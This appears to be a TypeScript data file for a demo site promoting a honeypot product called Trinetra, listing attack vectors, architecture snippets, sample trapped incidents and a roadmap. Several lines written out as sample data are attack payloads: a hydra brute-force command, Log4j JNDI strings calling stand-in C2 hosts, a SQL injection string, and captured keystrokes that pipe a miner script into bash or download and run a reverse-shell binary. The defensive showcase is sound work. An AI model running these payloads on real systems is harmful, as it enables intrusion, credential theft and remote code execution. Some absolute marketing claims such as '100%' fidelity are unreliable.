import {
  AttackVector,
  ComparisonRow,
  ArchitectureLayer,
  CapturedIncident,
  MitreTacticItem,
  RoadmapPhase,
} from '../types';

export const ATTACK_VECTORS: AttackVector[] = [
  {
    id: 'ssh-brute',
    name: 'SSH Distributed Brute-Force',
    protocol: 'TCP / Port 22',
    cveOrTtp: 'T1110.001 - Password Spraying',
    description: 'High-frequency credential stuffing targeting root and svc_backup accounts.',
    targetPort: 22,
    simulatedPayload: 'hydra -L users.txt -P rockyou.txt ssh://192.168.1.10 -t 16',
    mitreTactic: 'Credential Access',
  },
  {
    id: 'log4j-rce',
    name: 'Log4j Zero-Day JNDI RCE',
    protocol: 'TCP / Port 8080',
    cveOrTtp: 'CVE-2021-44228 / T1190 - Exploit Public App',
    description: 'Injected JNDI string attempting outbound LDAP callback to adversary C2 server.',
    targetPort: 8080,
    simulatedPayload: '${jndi:ldap://evil-c2.attacker-mesh.net:1389/Exploit}',
    mitreTactic: 'Initial Access',
  },
  {
    id: 'sqli-pivot',
    name: 'Blind SQLi Database Enumeration',
    protocol: 'TCP / Port 443',
    cveOrTtp: 'T1190 - SQL Injection & Schema Recon',
    description: 'Time-based blind SQL injection probing admin schema and credit card hashes.',
    targetPort: 443,
    simulatedPayload: "' UNION SELECT NULL, pg_sleep(5), version()--",
    mitreTactic: 'Discovery',
  },
  {
    id: 'lateral-recon',
    name: 'Internal Lateral SMB Scan',
    protocol: 'TCP / Port 445',
    cveOrTtp: 'T1046 - Network Service Scanning',
    description: 'SYN scan seeking exposed SMB shares with default null sessions.',
    targetPort: 445,
    simulatedPayload: 'nmap -sS -p 445 --script smb-vuln-ms17-010 192.168.1.0/24',
    mitreTactic: 'Lateral Movement',
  },
];

export const COMPARISON_DATA: ComparisonRow[] = [
  {
    aspect: 'Connection Response',
    traditional: {
      title: 'Immediate TCP RST / Drop',
      description: 'Sends explicit TCP Reset or drops packets immediately, signaling defensive blocking.',
      status: 'negative',
    },
    trinetra: {
      title: 'Silent Zero-Drop Socket Shift',
      description: 'Handshake accepted; stateful proxy diverts the TCP socket into a high-interaction decoy sandbox in <0.4ms.',
      status: 'positive',
    },
  },
  {
    aspect: 'Adversary Awareness',
    traditional: {
      title: 'Alerts Attacker Instantly',
      description: 'Attacker recognizes EDR signature, pivots to obfuscated tools, and shifts to alternate perimeter targets.',
      status: 'negative',
    },
    trinetra: {
      title: 'Zero Attacker Feedback',
      description: 'Adversary believes they breached an authentic server. Keeps attacking in the decoy sandbox without realizing.',
      status: 'positive',
    },
  },
  {
    aspect: 'Telemetry & Signal Quality',
    traditional: {
      title: 'High Noise & False Positives',
      description: 'Dozens of alerts per hour from scanning bots and benign administrative scripts cause severe SOC fatigue.',
      status: 'negative',
    },
    trinetra: {
      title: '100% True Threat Fidelity',
      description: 'Zero legitimate business traffic ever enters decoys. Any interaction is by definition 100% malicious and verified.',
      status: 'positive',
    },
  },
  {
    aspect: 'Post-Exploit Visibility',
    traditional: {
      title: 'Blind Post-Drop',
      description: 'Connection severed on detection. Zero insight into adversary intent, second-stage payloads, or zero-day zero-keys.',
      status: 'negative',
    },
    trinetra: {
      title: 'Complete TTP & Keystroke Extraction',
      description: 'Captures full shell keystrokes, downloaded second-stage malware, uncompiled memory strings, and C2 IPs.',
      status: 'positive',
    },
  },
  {
    aspect: 'Defense Value',
    traditional: {
      title: 'Purely Reactive Whack-a-Mole',
      description: 'Stops one probe while the adversary continues exploring vulnerabilities in neighboring subnets.',
      status: 'negative',
    },
    trinetra: {
      title: 'Adversary-Powered Intelligence',
      description: 'Turns active hackers into unwitting red teamers testing your defenses, feeding SIEM/SOAR with targeted IOCs.',
      status: 'positive',
    },
  },
];

export const ARCHITECTURE_LAYERS: ArchitectureLayer[] = [
  {
    number: 1,
    id: 'layer-1',
    name: 'Telemetry & Sensor Layer (eBPF / ETW)',
    shortTitle: 'eBPF / ETW Sensor',
    subtitle: 'Safe, kernel-level visibility without driver crash risks',
    description:
      'Hooks directly into kernel network sockets (`kprobe/tcp_v4_connect` and `sys_enter_connect`) via verified eBPF bytecode. Eliminates the catastrophic OS crash risks associated with legacy third-party kernel drivers while inspecting packets at line-rate.',
    techStack: ['Linux eBPF (BCC / libbpf)', 'Windows ETW Sensors', 'XDP Ring Buffers', 'TC (Traffic Control) Filter'],
    keySpecs: [
      { metric: '< 2.1 µs', label: 'Hook Latency' },
      { metric: '0%', label: 'Kernel Panic Risk' },
      { metric: '10 Gbps', label: 'Line-Rate Throughput' },
      { metric: '100% Non-Invasive', label: 'Zero Driver Crashes' },
    ],
    codeSnippet: `// Linux eBPF Sensor Hook (Kernel BPF Verifier Safe)
SEC("kprobe/sys_enter_connect")
int trinetra_socket_interceptor(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct sock_key key = {};
    bpf_probe_read_user(&key.dest_ip, sizeof(key.dest_ip), ...);

    // Evaluate against Deception Triad Classifier
    if (is_anomalous_socket_probe(&key)) {
        bpf_ringbuf_output(&deception_ringbuf, &key, sizeof(key), 0);
        return REDIRECT_TO_DECEPTION_PROXY; // Port 9000
    }
    return 0; // Forward untouched to Production
}`,
    codeLanguage: 'c',
    guardrail: 'Verified by in-kernel eBPF verifier: bounded loops, zero memory leaks, zero panic triggers.',
  },
  {
    number: 2,
    id: 'layer-2',
    name: 'Smart Rerouting Proxy',
    shortTitle: 'Smart Rerouting Proxy',
    subtitle: 'Stateful middleware shifting sockets seamlessly without TCP drops',
    description:
      'High-concurrency state machine running as a transparent socket proxy. When suspicious telemetry triggers an anomaly threshold, the ongoing TCP connection is gracefully handed over to an isolated decoy container without terminating the handshake or emitting TCP RST packets.',
    techStack: ['Python AsyncIO Gateway (Port 9000)', 'Socket Splicing (splice syscall)', 'TCP State Preserver', 'Zero-RST Handshake Bridge'],
    keySpecs: [
      { metric: '< 0.4 ms', label: 'Socket Handoff Time' },
      { metric: '0 Drops', label: 'TCP RST Avoidance' },
      { metric: '100k+', label: 'Concurrent Sockets' },
      { metric: 'Transparent', label: 'Attacker Visibility' },
    ],
    codeSnippet: `async def handle_inbound_stream(reader, writer):
    client_ip, client_port = writer.get_extra_info('peername')
    handshake = await reader.read(1024)

    if detector.is_exploit_vector(handshake):
        # Silently pivot socket to Decoy Sandbox on Port 2222
        decoy_reader, decoy_writer = await asyncio.open_connection('10.99.0.42', 2222)
        decoy_writer.write(handshake)
        await asyncio.gather(
            pipe_with_keylogger(reader, decoy_writer, client_ip),
            pipe_decoy_response(decoy_reader, writer)
        )
    else:
        # Pass legitimate traffic to Production Server
        await forward_to_prod_server(reader, writer, handshake)`,
    codeLanguage: 'python',
    guardrail: 'Full MTU preservation, bidirectional TLS termination or passthrough with zero TCP reset flags emitted.',
  },
  {
    number: 3,
    id: 'layer-3',
    name: 'Autonomous Decoy Engine',
    shortTitle: 'Autonomous Decoy Engine',
    subtitle: 'Ephemeral, micro-segmented sandboxes with honeyfiles and canary tokens',
    description:
      'Dynamic, synthetic runtime environments configured to mimic genuine enterprise services (Linux bastion, Kubernetes nodes, Redis caches, CI/CD pipelines). Decoys are seeded with poisoned canary files (`AWS_SECRET_KEYS.env`, fake database dump tables, canary Git history).',
    techStack: ['Ephemeral Pod Sandboxes (Port 2222)', 'CanaryTokens API Integration', 'Synthetic File Stubs', 'Network Egress Jails'],
    keySpecs: [
      { metric: '100% Isolated', label: 'No Lateral Movement' },
      { metric: '150 ms', label: 'Decoy Spin-up Time' },
      { metric: '12+ Canaries', label: 'Honeyfiles per Pod' },
      { metric: 'Auto-Snapshot', label: 'Instant Memory Forensics' },
    ],
    codeSnippet: `apiVersion: deception.trinetra.io/v1alpha1
kind: DecoySandbox
metadata:
  name: decoy-bastion-node-42
spec:
  ephemeralTTL: 3600s
  networkPolicy:
    egress:
      blockAll: true # Zero lateral pivot to production VPC
      syntheticDnsSinkhole: true
  canaryFiles:
    - path: /root/.aws/credentials
      tokenType: canary_aws_sts
      beaconUrl: "https://canary.trinetra.internal/t/x9f8a2"
    - path: /var/www/.env
      tokenType: fake_pg_connection_string`,
    codeLanguage: 'yaml',
    guardrail: 'Strict network namespace isolation: Decoys cannot ping, probe, or route packets into legitimate infrastructure.',
  },
  {
    number: 4,
    id: 'layer-4',
    name: 'Threat Intelligence & CTI Dashboard',
    shortTitle: 'CTI & MITRE ATT&CK',
    subtitle: 'Automated TTP mapping to the MITRE ATT&CK framework',
    description:
      'Real-time ingestion engine that consumes session logs, keystroke streams, memory dumps, and honeytoken triggers. Automatically tags adversary activity against the MITRE ATT&CK Enterprise Matrix, compiles STIX 2.1 threat packages, and exports high-confidence IOCs directly to your SIEM/SOAR.',
    techStack: ['MITRE ATT&CK Auto-Classifier', 'Streamlit Real-Time Feed', 'STIX 2.1 / TAXII Exporter', 'Splunk / Sentinel Webhooks'],
    keySpecs: [
      { metric: 'Real-Time', label: 'Keystroke Forensics' },
      { metric: '18+ MITRE', label: 'Tactics Auto-Mapped' },
      { metric: 'STIX 2.1', label: 'Standard IOC Format' },
      { metric: '1-Click', label: 'SOAR Actionable Trigger' },
    ],
    codeSnippet: `def ingest_decoy_telemetry(session_events):
    ttp_tags = mitre_classifier.classify_commands([e['cmd'] for e in session_events])
    # e.g., ['T1059.004 - Unix Shell', 'T1552.001 - Credentials in Files']
    
    ioc_package = {
        "type": "indicator",
        "spec_version": "2.1",
        "id": f"indicator--{uuid4()}",
        "adversary_ip": session_events[0]['ip'],
        "confidence": 100,
        "mitre_attack_tactics": ttp_tags,
        "captured_keystrokes": [e['cmd'] for e in session_events],
        "canary_tripped": any(e.get('canary_hit') for e in session_events)
    }
    broadcast_to_siem_webhook(ioc_package)`,
    codeLanguage: 'python',
    guardrail: 'Automated digital signature and SHA-256 chain of custody for all downloaded binaries and memory snapshots.',
  },
];

export const INITIAL_CAPTURED_INCIDENTS: CapturedIncident[] = [
  {
    id: 'INC-8821',
    timestamp: 'Just now (12s ago)',
    attackerIp: '185.220.101.42',
    country: 'Netherlands (Tor Exit Node)',
    targetPort: 22,
    decoyAssigned: 'decoy-pod-linux-bastion-01',
    keystrokes: [
      'whoami',
      'uname -a',
      'cat /var/data/AWS_SECRET_KEYS.env',
      'curl -s http://194.26.29.112/miner.sh | bash',
    ],
    canaryTriggered: '/var/data/AWS_SECRET_KEYS.env [CANARY_TRIP_KEY_X8]',
    status: 'Trapped & Active',
    mitreCode: 'T1059.004 / T1552.001',
    sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
  },
  {
    id: 'INC-8820',
    timestamp: '4 mins ago',
    attackerIp: '91.240.118.17',
    country: 'Bulgaria (VPN Range)',
    targetPort: 8080,
    decoyAssigned: 'decoy-pod-spring-app-04',
    keystrokes: [
      'GET /${jndi:ldap://c2.interceptor.cc:1389/Payload}',
      'curl http://c2.interceptor.cc/rev.elf -o /tmp/rev',
      'chmod +x /tmp/rev && /tmp/rev',
    ],
    canaryTriggered: 'JNDI Callback Canary Intercepted',
    status: 'Isolated',
    mitreCode: 'CVE-2021-44228 / T1190',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
  },
  {
    id: 'INC-8819',
    timestamp: '18 mins ago',
    attackerIp: '45.154.255.89',
    country: 'Seychelles (Cloud Host)',
    targetPort: 445,
    decoyAssigned: 'decoy-pod-ad-domain-controller',
    keystrokes: [
      'net user /domain',
      'dir \\\\decoy-dc\\SYSVOL\\scripts',
      'powershell -enc JABzACAAPQAgAE4AZQB3AC0...',
    ],
    canaryTriggered: 'SYSVOL\\deploy_tokens.xml accessed',
    status: 'Snapshot Archived',
    mitreCode: 'T1087.002 / T1059.001',
    sha256: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
  },
];

export const MITRE_TACTICS: MitreTacticItem[] = [
  {
    id: 'T1190',
    name: 'Exploit Public-Facing Application',
    code: 'T1190',
    severity: 'Critical',
    capturedCount: 142,
    lastDetected: '3m ago',
  },
  {
    id: 'T1059.004',
    name: 'Unix Shell Execution',
    code: 'T1059.004',
    severity: 'Critical',
    capturedCount: 98,
    lastDetected: '12s ago',
  },
  {
    id: 'T1552.001',
    name: 'Credentials In Files (Honeyfiles)',
    code: 'T1552.001',
    severity: 'High',
    capturedCount: 67,
    lastDetected: '12s ago',
  },
  {
    id: 'T1110.001',
    name: 'Password Guessing / SSH Spray',
    code: 'T1110.001',
    severity: 'Medium',
    capturedCount: 312,
    lastDetected: '1m ago',
  },
  {
    id: 'T1046',
    name: 'Network Service Scanning',
    code: 'T1046',
    severity: 'Medium',
    capturedCount: 521,
    lastDetected: '8m ago',
  },
  {
    id: 'T1071.001',
    name: 'Web Protocols C2 Beaconing',
    code: 'T1071.001',
    severity: 'High',
    capturedCount: 44,
    lastDetected: '14m ago',
  },
];

export const ROADMAP_DATA: RoadmapPhase[] = [
  {
    phase: 'Phase 1',
    title: 'Functional PoC (Current Baseline)',
    status: 'Current PoC',
    timeline: 'Completed & Operational',
    tagline: 'Python Proxy Gateway ➔ Isolated Decoy ➔ Streamlit Telemetry',
    highlight: true,
    milestones: [
      'Python Stateful AsyncIO Proxy running on Port 9000',
      'Isolated SSH Decoy Container running on Port 2222',
      'Real-time keystroke and payload interceptor hook',
      'Interactive Streamlit SOC Dashboard telemetry display',
      'Initial canary token deployment (`AWS_SECRET_KEYS.env`)',
    ],
  },
  {
    phase: 'Phase 2',
    title: 'eBPF Integration & Auto-Honeyfiles',
    status: 'In Progress',
    timeline: 'Q3 - Q4 2026',
    tagline: 'Zero-Driver Kernel Probes & Generative Deception Assets',
    highlight: false,
    milestones: [
      'Kernel-level socket diversion with eBPF TC/XDP filters (sub-millisecond handoff)',
      'Dynamic Generative Honeyfiles tailored to host organization architecture',
      'Windows ETW (Event Tracing for Windows) support for Active Directory decoys',
      'Automated synthetic delay emulation to simulate heavy database responses',
      'Memory volatility dumper running on decoy container termination',
    ],
  },
  {
    phase: 'Phase 3',
    title: 'Commercial SaaS & Automated MITRE Export',
    status: 'Planned',
    timeline: 'Q1 - Q2 2027',
    tagline: 'Multi-Cloud Mesh, Automated SOAR Webhooks & STIX 2.1 Feeds',
    highlight: false,
    milestones: [
      'Multi-cloud Kubernetes operator: AWS EKS, GCP GKE, Azure AKS, Bare-Metal',
      'Automated STIX 2.1 / TAXII feeds streaming to enterprise SIEM/SOAR',
      'AI-driven adaptive conversational decoy responses (interactive fake shells)',
      'FedRAMP & SOC 2 Type II compliance audit framework',
      'Global Deception Mesh with distributed decoy routing across 20+ cloud regions',
    ],
  },
];
